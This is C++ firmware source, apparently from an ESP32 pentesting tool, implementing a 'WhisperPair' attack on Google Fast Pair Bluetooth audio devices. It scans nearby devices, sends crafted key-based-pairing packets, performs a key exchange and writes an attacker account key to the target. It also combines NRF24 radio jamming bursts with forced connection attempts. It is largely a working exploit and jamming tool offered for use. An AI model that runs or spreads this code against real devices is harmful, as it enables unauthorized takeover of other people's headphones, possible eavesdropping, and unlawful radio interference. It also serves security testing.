#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include "modules/NRF24/nrf_jammer_api.h"

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;

#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif

AudioCommandService audioCmd;
FastPairCrypto crypto;

void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor = TFT_BLACK, uint16_t textColor = TFT_WHITE) {
    tft.fillScreen(bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(textColor, bgColor);
    
    int yPos = 60;
    int lineHeight = 20;
    int maxLines = 8;
    
    for(int i = 0; i < min((int)lines.size(), maxLines); i++) {
        tft.setCursor(20, yPos);
        
        String displayLine = lines[i];
        if(displayLine.length() > 35) {
            displayLine = displayLine.substring(0, 32) + "...";
        }
        
        tft.print(displayLine);
        yPos += lineHeight;
    }
    
    tft.setCursor(20, 220);
    tft.print("Press any key to continue...");
    
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true, bool autoProgress = false) {
    int buttonCount = 0;
    if(strlen(btn1) > 0) buttonCount++;
    if(strlen(btn2) > 0) buttonCount++;
    if(strlen(btn3) > 0) buttonCount++;

    if(buttonCount == 0 && autoProgress) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }
        
        delay(1500);
        return 0;
    }
    
    if(buttonCount == 0) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }

        tft.setCursor(20, 140);
        tft.print("Press any key to continue...");

        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else if(buttonCount == 1) {
        const char* buttons[] = {btn1, btn2, btn3};
        const char* actualBtn = "";
        for(int i = 0; i < 3; i++) {
            if(strlen(buttons[i]) > 0) {
                actualBtn = buttons[i];
                break;
            }
        }

        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            if(lineStr.length() > 60) {
                tft.setCursor(20, 95);
                tft.print(lineStr.substring(30, 60) + "...");
            }
        } else {
            tft.print(line1);
        }

        String btnText = actualBtn;
        if(btnText.length() > 12) {
            btnText = btnText.substring(0, 9) + "...";
        }
        
        int btnWidth = btnText.length() * 12 + 20;
        if(btnWidth < 100) btnWidth = 100;
        int btnX = (tftWidth - btnWidth) / 2;
        int btnY = 150;

        tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
        
        int textWidth = btnText.length() * 6;
        int textX = btnX + (btnWidth - textWidth) / 2;
        tft.setCursor(textX, btnY + 12);
        tft.print(btnText);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 200);
        tft.print("SEL: Select  ESC: Cancel");

        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else {
        return displayMessage(line1, btn1, btn2, btn3, color);
    }
}

void showWarningMessage(const char* message) {
    tft.fillScreen(TFT_YELLOW);
    drawMainBorderWithTitle("WARNING");
    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
    tft.setCursor(20, 70);
    
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showErrorMessage(const char* message) {
    tft.fillScreen(TFT_RED);
    drawMainBorderWithTitle("ERROR");
    tft.setTextColor(TFT_WHITE, TFT_RED);
    
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
    tft.setCursor(20, 70);
    
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showSuccessMessage(const char* message) {
    tft.fillScreen(TFT_GREEN);
    drawMainBorderWithTitle("SUCCESS");
    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
    tft.setCursor(20, 70);
    
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

bool initBLEIfNeeded(const char* deviceName) {
    static bool initialized = false;

    if (!initialized) {
        NimBLEDevice::init(deviceName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        initialized = true;
    }

    return true;
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");

    tft.fillRect(20, 50, tftWidth - 40, 100, bruceConfig.bgColor);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 85);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }

    while(true) {
        if(check(EscPress)) {
            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE);
            return false;
        }
        if(check(SelPress)) {
            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE);
            delay(300);
            return true;
        }
        delay(50);
    }
}

bool checkIfFastPairDevice(NimBLEAddress target) {
    std::vector<String> debugLines;
    debugLines.push_back("Checking device...");

    NimBLEClient* pClient = NimBLEDevice::createClient();
    pClient->setConnectTimeout(5);

    if(!pClient->connect(target, true)) {
        debugLines.push_back("Connection failed!");
        showDeviceInfoScreen("DEVICE CHECK", debugLines, TFT_RED, TFT_WHITE);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    debugLines.push_back("Connected successfully");
    debugLines.push_back("Discovering services...");

    const std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
    
    bool hasFastPair = false;
    int serviceCount = 0;
    
    if(services) {
        serviceCount = services->size();
        debugLines.push_back("Found " + String(serviceCount) + " services:");
        
        for(int i = 0; i < min(6, (int)services->size()); i++) {
            String uuid = (*services)[i]->getUUID().toString().c_str();
            debugLines.push_back("[" + String(i+1) + "] " + uuid);
            
            if(uuid.indexOf("fe2c") != -1 || uuid.indexOf("FE2C") != -1) {
                hasFastPair = true;
            }
        }
        
        if(services->size() > 6) {
            debugLines.push_back("... and " + String(services->size() - 6) + " more");
        }
    } else {
        debugLines.push_back("No services found!");
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    
    if(hasFastPair) {
        debugLines.push_back("");
        debugLines.push_back("✓ FASTPAIR DEVICE DETECTED");
        showDeviceInfoScreen("FASTPAIR DEVICE", debugLines, TFT_GREEN, TFT_BLACK);
        return true;
    } else {
        debugLines.push_back("");
        debugLines.push_back("✗ No FastPair service (FE2C)");
        showDeviceInfoScreen("NOT FASTPAIR", debugLines, TFT_YELLOW, TFT_BLACK);
        return false;
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    std::vector<String> debugLines;
    debugLines.push_back("Connecting to target...");

    NimBLEClient* pClient = NimBLEDevice::createClient();
    pClient->setConnectTimeout(8);

    bool connected = pClient->connect(target, false);
    if(!connected) {
        debugLines.push_back("Direct connect failed");
        debugLines.push_back("Trying auto-connect...");
        delay(300);
        connected = pClient->connect(target, true);
    }

    if(!connected) {
        debugLines.push_back("Connection failed!");
        debugLines.push_back("Device may be:");
        debugLines.push_back("- Paired to another device");
        debugLines.push_back("- Out of range");
        debugLines.push_back("- Not connectable");
        showDeviceInfoScreen("CONNECTION FAILED", debugLines, TFT_RED, TFT_WHITE);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    debugLines.push_back("Connected!");
    debugLines.push_back("Looking for FastPair service...");

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        debugLines.push_back("FastPair service not found!");
        debugLines.push_back("(UUID FE2C not available)");
        
        const std::vector<NimBLERemoteService*>* services = pClient->getServices(false);
        if(services && services->size() > 0) {
            debugLines.push_back("Available services:");
            for(int i = 0; i < min(4, (int)services->size()); i++) {
                String uuid = (*services)[i]->getUUID().toString().c_str();
                debugLines.push_back(uuid);
            }
        }
        
        showDeviceInfoScreen("NO FASTPAIR", debugLines, TFT_YELLOW, TFT_BLACK);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    debugLines.push_back("FastPair service found!");
    debugLines.push_back("Looking for KBP characteristic...");
    showDeviceInfoScreen("TESTING", debugLines, bruceConfig.bgColor, TFT_WHITE);

    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        showWarningMessage("KBP char not found!");
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    showAdaptiveMessage("Sending test packet...", "", "", "", TFT_WHITE, false, true);

    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;

    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);

    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);

    if(pChar->writeValue(packet, 16, false)) {
        showAdaptiveMessage("Packet sent, checking...", "", "", "", TFT_WHITE, false, true);
        delay(100);

        bool vulnerable = pChar->canRead() || pChar->canNotify();
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);

        if(vulnerable) {
            showSuccessMessage("DEVICE VULNERABLE!");
            return true;
        } else {
            showWarningMessage("No response - may be patched");
            return false;
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
    std::vector<String> debugLines;
    debugLines.push_back("Connecting...");

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target, true)) {
        debugLines.push_back("Connection failed!");
        showDeviceInfoScreen("KEY EXCHANGE", debugLines, TFT_RED, TFT_WHITE);
        return false;
    }

    debugLines.push_back("Connected!");
    debugLines.push_back("Discovering services...");
    showDeviceInfoScreen("KEY EXCHANGE", debugLines, bruceConfig.bgColor, TFT_WHITE);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showErrorMessage("No FastPair service");
        pClient->disconnect();
        return false;
    }

    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        showErrorMessage("No KBP char");
        pClient->disconnect();
        return false;
    }

    showAdaptiveMessage("Generating key...", "", "", "", TFT_WHITE, false, true);

    uint8_t our_pubkey[65];
    size_t pub_len = 65;
    if(!crypto.generateKeyPair(our_pubkey, &pub_len)) {
        showErrorMessage("Key gen failed");
        pClient->disconnect();
        return false;
    }

    uint8_t keyExchangeMsg[67] = {0};
    keyExchangeMsg[0] = 0x00;
    keyExchangeMsg[1] = 0x20;
    memcpy(&keyExchangeMsg[2], our_pubkey, 65);

    showAdaptiveMessage("Sending key...", "", "", "", TFT_WHITE, false, true);

    if(!pKeyChar->writeValue(keyExchangeMsg, 67, false)) {
        showErrorMessage("Send failed");
        pClient->disconnect();
        return false;
    }

    delay(100);
    showAdaptiveMessage("Waiting response...", "", "", "", TFT_WHITE, false, true);

    std::string response = pKeyChar->readValue();
    if(response.length() < 67) {
        showErrorMessage("Bad response");
        pClient->disconnect();
        return false;
    }

    const uint8_t* their_pubkey = (const uint8_t*)response.c_str() + 2;
    if(!crypto.computeSharedSecret(their_pubkey, 65)) {
        showErrorMessage("Shared secret failed");
        pClient->disconnect();
        return false;
    }

    memcpy(shared_secret, crypto.getSharedSecret(), 32);
    pClient->disconnect();
    return true;
}

bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secret) {
    showAdaptiveMessage("Completing pairing...", "", "", "", TFT_WHITE, false, true);
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient->connect(target, true)) return false;

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        return false;
    }

    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        pClient->disconnect();
        return false;
    }

    uint8_t nonce[16];
    esp_fill_random(nonce, 16);

    uint8_t pairingData[50] = {0};
    pairingData[0] = 0x00;
    pairingData[1] = 0x30;
    memcpy(&pairingData[2], nonce, 16);
    memcpy(&pairingData[18], shared_secret, 16);

    if(!pKeyChar->writeValue(pairingData, 34, false)) {
        pClient->disconnect();
        return false;
    }

    delay(100);

    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar) {
        crypto.generateAccountKey();
        pAccountChar->writeValue(crypto.getAccountKey(), 16, true);
    }

    pClient->disconnect();
    return true;
}

bool whisperPairFullExploit(NimBLEAddress target) {
    uint8_t shared_secret[32];

    if(!fastpair_ecdh_key_exchange(target, shared_secret)) return false;
    if(!fastpair_complete_pairing(target, shared_secret)) return false;

    return true;
}

String selectTargetFromScan(const char* title) {
    String selectedMAC = "";
    uint8_t selectedAddrType = BLE_ADDR_PUBLIC;
    
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    
    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Initializing BLE...");
    
    NimBLEDevice::deinit(true);
    delay(100);
    NimBLEDevice::init("Bruce-Scanner");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    
    NimBLEScan* pBLEScan = NimBLEDevice::getScan();
    
    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    
    if (!pBLEScan) {
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.print("BLE INIT FAIL");
        showErrorMessage("Scanner init failed");
        return "";
    }
    
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.print("BLE INIT OK");
    delay(1000);
    
    pBLEScan->clearResults();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(67);
    pBLEScan->setWindow(33);
    pBLEScan->setDuplicateFilter(false);
    
    tft.fillRect(20, 60, tftWidth - 40, 80, bruceConfig.bgColor);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Scanning for 20s...");
    tft.setCursor(20, 80);
    tft.print("Please wait");
    tft.setCursor(20, 100);
    tft.print("Press ESC to cancel");
    
    unsigned long scanStart = millis();
    pBLEScan->start(0, true);
    
    unsigned long lastUpdate = millis();
    
    while (millis() - scanStart < 20000) {
        unsigned long now = millis();
        int elapsed = (now - scanStart) / 1000;
        
        if (now - lastUpdate >= 1000) {
            lastUpdate = now;
            tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
            tft.setCursor(20, 60);
            tft.printf("Scanning... %d/20s", elapsed);
        }
        
        if (check(EscPress)) {
            pBLEScan->stop();
            return "";
        }
        
        delay(10);
    }
    
    pBLEScan->stop();
    NimBLEScanResults foundDevices = pBLEScan->getResults();
    
    struct DeviceInfo {
        String name;
        String address;
        uint8_t addrType;
        int rssi;
    };
    
    std::vector<DeviceInfo> devices;
    
    for(int i = 0; i < foundDevices.getCount(); i++) {
        const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
        if(!device) continue;
        
        DeviceInfo dev;
        dev.name = device->getName().c_str();
        dev.address = device->getAddress().toString().c_str();
        dev.addrType = device->getAddressType();
        dev.rssi = device->getRSSI();
        
        if (dev.name.isEmpty() || dev.name == "(null)" || dev.name == "null") {
            dev.name = dev.address;
        }
        
        devices.push_back(dev);
    }
    
    pBLEScan->clearResults();
    
    tft.fillRect(20, 60, tftWidth - 40, 80, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Scan complete!");
    tft.setCursor(20, 80);
    tft.printf("Found: %d device(s)", devices.size());
    
    delay(1500);
    
    if (devices.empty()) {
        showWarningMessage("NO DEVICES FOUND");
        delay(1500);
        return "";
    }
    
    std::sort(devices.begin(), devices.end(), [](const DeviceInfo& a, const DeviceInfo& b) {
        return a.rssi > b.rssi;
    });
    
    const int maxDevices = min((int)devices.size(), 6);
    int selectedIdx = 0;
    bool exitLoop = false;
    
    while(!exitLoop) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("SELECT DEVICE");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        
        int yPos = 60;
        for(int i = 0; i < maxDevices; i++) {
            const auto& dev = devices[i];
            String displayText = dev.name;
            
            if(displayText.length() > 18) {
                displayText = displayText.substring(0, 15) + "...";
            }
            displayText += " (" + String(dev.rssi) + "dB)";
            
            if(i == selectedIdx) {
                tft.fillRect(20, yPos, tftWidth - 40, 22, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
            } else {
                tft.fillRect(20, yPos, tftWidth - 40, 22, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            }
            
            tft.setCursor(25, yPos + 6);
            tft.print(displayText);
            yPos += 24;
        }
        
        tft.setCursor(20, yPos + 10);
        tft.print("UP/DOWN: Select  SEL: Connect  ESC: Back");
        
        unsigned long inputWaitStart = millis();
        bool gotInput = false;
        
        while(!gotInput && millis() - inputWaitStart < 30000) {
            if(check(PrevPress)) {
                if(selectedIdx > 0) {
                    selectedIdx--;
                }
                gotInput = true;
                delay(200);
            }
            else if(check(NextPress)) {
                if(selectedIdx < maxDevices - 1) {
                    selectedIdx++;
                }
                gotInput = true;
                delay(200);
            }
            else if(check(SelPress)) {
                tft.fillRect(20, yPos + 40, tftWidth - 40, 30, bruceConfig.bgColor);
                tft.setCursor(20, yPos + 40);
                tft.print("Connecting...");
                delay(500);
                
                selectedMAC = devices[selectedIdx].address;
                selectedAddrType = devices[selectedIdx].addrType;
                exitLoop = true;
                gotInput = true;
            }
            else if(check(EscPress)) {
                exitLoop = true;
                gotInput = true;
            }
            
            if(!gotInput) {
                delay(10);
            }
        }
        
        if(millis() - inputWaitStart >= 30000) {
            showWarningMessage("Selection timeout");
            break;
        }
    }
    
    NimBLEDevice::deinit(true);
    
    if (!selectedMAC.isEmpty()) {
        return selectedMAC + ":" + String(selectedAddrType);
    }
    
    return "";
}

void testFastPairVulnerability() {
    initBLEIfNeeded("Bruce-WP");
    
    String selectedInfo = selectTargetFromScan("FAST PAIR SCAN");
    if(selectedInfo.isEmpty()) return;
    
    int colonPos = selectedInfo.lastIndexOf(':');
    if(colonPos == -1) {
        showErrorMessage("Invalid device info");
        return;
    }
    
    String selectedMAC = selectedInfo.substring(0, colonPos);
    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
    
    NimBLEAddress target;
    try {
        target = NimBLEAddress(selectedMAC.c_str(), addrType);
    } catch (...) {
        showErrorMessage("Invalid MAC address");
        return;
    }
    
    if(!requireSimpleConfirmation("Test vulnerability?\nSEL=Yes  ESC=No")) return;
    
    bool vulnerable = attemptKeyBasedPairing(target);
    
    delay(2000);
}

bool runExploitOnConnectedDevice(NimBLEClient* pClient, NimBLEAddress target) {
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) return false;
    
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pChar) return false;
    
    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;
    
    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);
    
    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);
    
    if(pChar->writeValue(packet, 16, false)) {
        delay(50);
        bool vulnerable = pChar->canRead() || pChar->canNotify();
        
        if(vulnerable) {
            showSuccessMessage("EXPLOIT SUCCESS!");
            return true;
        }
    }
    return false;
}

void aggressiveJamAndExploit(NimBLEAddress target) {
    if(isNRF24Available()) {
        showAdaptiveMessage("Aggressive Signal Attack", "Multiple disruption bursts", "", "", TFT_WHITE, false, true);
        
        for(int i = 0; i < 3; i++) {
            startJammer();
            delay(500);
            stopJammer();
            delay(200);
            
            showAdaptiveMessage(("Burst " + String(i+1) + "/3").c_str(), "Attempting connection...", "", "", TFT_WHITE, false, true);
            
            NimBLEClient* pClient = NimBLEDevice::createClient();
            pClient->setConnectTimeout(2);
            
            if(pClient->connect(target, false)) {
                showAdaptiveMessage(("Connected on burst " + String(i+1)).c_str(), "Running exploit...", "", "", TFT_WHITE, false, true);
                
                if(runExploitOnConnectedDevice(pClient, target)) {
                    NimBLEDevice::deleteClient(pClient);
                    return;
                }
                pClient->disconnect();
            }
            NimBLEDevice::deleteClient(pClient);
        }
    }
    
    showAdaptiveMessage("Fallback: Direct attempt", "", "", "", TFT_WHITE, false, true);
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    pClient->setConnectTimeout(5);
    
    if(pClient->connect(target, false)) {
        showAdaptiveMessage("Direct connection", "Running exploit...", "", "", TFT_WHITE, false, true);
        runExploitOnConnectedDevice(pClient, target);
        pClient->disconnect();
    } else {
        showErrorMessage("Connection failed");
    }
    
    NimBLEDevice::deleteClient(pClient);
}

void jamAndConnectMenu() {
    if(!isNRF24Available()) {
        tft.fillScreen(TFT_RED);
        drawMainBorderWithTitle("NRF24 JAMMER");
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.setCursor(20, 60);
        tft.print("NRF24L01+ Module");
        tft.setCursor(20, 90);
        tft.print("Status: NOT FOUND");
        tft.setCursor(20, 120);
        tft.print("Connect module and");
        tft.setCursor(20, 140);
        tft.print("restart device");
        tft.setCursor(20, 180);
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.print("Press any key to return");
        
        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return;
            }
            delay(50);
        }
    }
    
    std::vector<Option> jamOptions;
    
    jamOptions.push_back({"[Scan then Jam Connect]", [&]() {
        String selectedInfo = selectTargetFromScan("SCAN TARGET");
        if(selectedInfo.isEmpty()) return;
        
        int colonPos = selectedInfo.lastIndexOf(':');
        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
        NimBLEAddress target(selectedMAC.c_str(), addrType);
        
        if(requireSimpleConfirmation("Jam while connecting?")) {
            const char* jamModeNames[] = {
                "BLE Adv Only", "All BLE Channels", "BLE Adv Priority", 
                "Bluetooth All", "WiFi", "USB", "Video", "RC", "Full Spectrum"
            };
            
            String jamMode = jamModeNames[getCurrentJammerMode()];
            if(jamMode.length() > 20) {
                jamMode = jamMode.substring(0, 17) + "...";
            }
            
            std::vector<String> jamLines;
            jamLines.push_back("Jamming mode: " + jamMode);
            jamLines.push_back("Attempting connection...");
            jamLines.push_back("This may take 5 seconds");
            showDeviceInfoScreen("JAM & CONNECT", jamLines, TFT_YELLOW, TFT_BLACK);
            
            startJammer();
            
            unsigned long startTime = millis();
            NimBLEClient* pClient = NimBLEDevice::createClient();
            pClient->setConnectTimeout(5);
            
            bool connected = false;
            while(millis() - startTime < 5000 && !connected) {
                updateJammerChannel();
                
                if(pClient->connect(target, false)) {
                    connected = true;
                    showAdaptiveMessage("Connected!", "Running exploit...", "", "", TFT_WHITE, false, true);
                    runExploitOnConnectedDevice(pClient, target);
                    pClient->disconnect();
                    break;
                }
                delay(100);
            }
            
            if(!connected) {
                std::vector<String> failLines;
                failLines.push_back("Connection failed!");
                failLines.push_back("Possible reasons:");
                failLines.push_back("- Device is already paired");
                failLines.push_back("- Out of range");
                failLines.push_back("- Not connectable");
                showDeviceInfoScreen("FAILED", failLines, TFT_RED, TFT_WHITE);
            }
            
            stopJammer();
            NimBLEDevice::deleteClient(pClient);
        }
    }});
    
    jamOptions.push_back({"[Jam Burst Attack]", [&]() {
        String selectedInfo = selectTargetFromScan("SELECT TARGET");
        if(selectedInfo.isEmpty()) return;
        
        int colonPos = selectedInfo.lastIndexOf(':');
        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
        
        NimBLEAddress target;
        try {
            target = NimBLEAddress(selectedMAC.c_str(), addrType);
        } catch (...) {
            showErrorMessage("Invalid MAC address");
            return;
        }
        
        if(requireSimpleConfirmation("Start jam burst attack?")) {
            aggressiveJamAndExploit(target);
        }
    }});
    
    jamOptions.push_back({"[Set Jammer Mode]", [&]() {
        const char* jamModeNames[] = {
            "BLE Adv Only", "All BLE Channels", "BLE Adv Priority", 
            "Bluetooth All", "WiFi", "USB", "Video", "RC", "Full Spectrum"
        };
        
        const int visibleItems = 4;
        int selectedIdx = getCurrentJammerMode();
        int scrollOffset = 0;
        
        while(true) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SET JAMMER MODE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            
            int yPos = 60;
            for(int i = 0; i < visibleItems; i++) {
                int itemIdx = scrollOffset + i;
                if(itemIdx >= 9) break;
                
                if(itemIdx == selectedIdx) {
                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
                    tft.fillRect(20, yPos, tftWidth - 40, 25, TFT_WHITE);
                } else {
                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                }
                
                tft.setCursor(25, yPos + 7);
                tft.print(jamModeNames[itemIdx]);
                yPos += 28;
            }
            
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            tft.setCursor(20, 200);
            tft.print("UP/DOWN: Scroll  SEL: Choose");
            tft.setCursor(20, 220);
            tft.print("ESC: Back");
            
            if(check(EscPress)) {
                delay(200);
                return;
            }
            
            if(check(PrevPress)) {
                if(selectedIdx > 0) {
                    selectedIdx--;
                    if(selectedIdx < scrollOffset) {
                        scrollOffset = selectedIdx;
                    }
                } else {
                    selectedIdx = 8;
                    scrollOffset = max(0, 8 - visibleItems + 1);
                }
                delay(200);
            }
            
            if(check(NextPress)) {
                if(selectedIdx < 8) {
                    selectedIdx++;
                    if(selectedIdx >= scrollOffset + visibleItems) {
                        scrollOffset = selectedIdx - visibleItems + 1;
                    }
                } else {
                    selectedIdx = 0;
                    scrollOffset = 0;
                }
                delay(200);
            }
            
            if(check(SelPress)) {
                setJammerMode(selectedIdx);
                std::vector<String> confirmLines;
                confirmLines.push_back("Jammer mode set to:");
                confirmLines.push_back(jamModeNames[selectedIdx]);
                showDeviceInfoScreen("MODE SET", confirmLines, TFT_GREEN, TFT_BLACK);
                delay(1000);
                return;
            }
            
            delay(50);
        }
    }});
    
